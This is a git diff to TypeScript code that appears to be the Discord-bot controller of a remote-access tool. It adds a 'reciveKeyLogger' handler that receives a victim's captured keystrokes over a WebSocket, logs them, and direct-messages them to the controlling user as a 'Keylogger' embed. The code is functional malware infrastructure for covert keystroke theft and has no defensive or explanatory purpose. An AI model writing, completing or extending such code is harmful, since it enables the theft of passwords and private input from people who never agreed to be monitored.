@@ -4,7 +4,8 @@ import { Logger } from "@/shared/Logger";
 import {
 	type GetCmdCommand,
 	type WsTasksFromClient,
-	type MessageEvent
+	type MessageEvent,
+	type KeyLoggerEvent
 } from "@/types/ws-events.types";
 import { type Process } from "@/types/ws.types";
 import { fromBytesToMB } from "@/utils";
@@ -123,5 +124,29 @@ export class WsOthersEvents {
 		await owner.send({ embeds: [embed] });
 
 		// Logger.info(`Received message from WebSocket server: ${message}`);
+	};
+
+	reciveKeyLogger = async (data: KeyLoggerEvent) => {
+		const { controllerid, keys } = data;
+
+		const owner = await this.client.users.fetch(controllerid);
+		try {
+			const embed = {
+				title: "Keylogger",
+				description: `\`\`\`${keys.join("")}\`\`\``,
+				color: embeds.Colors.default,
+				timestamp: new Date().toISOString()
+			};
+
+			if (keys.length > 0) {
+				Logger.info(`Keys: ${keys.join(", ")}`);
+			} else {
+				Logger.info("No keys received");
+			}
+
+			await owner.send({ embeds: [embed] });
+		} catch (error) {
+			Logger.error("Error sending keylogger data", error);
+		}
 	};
 }
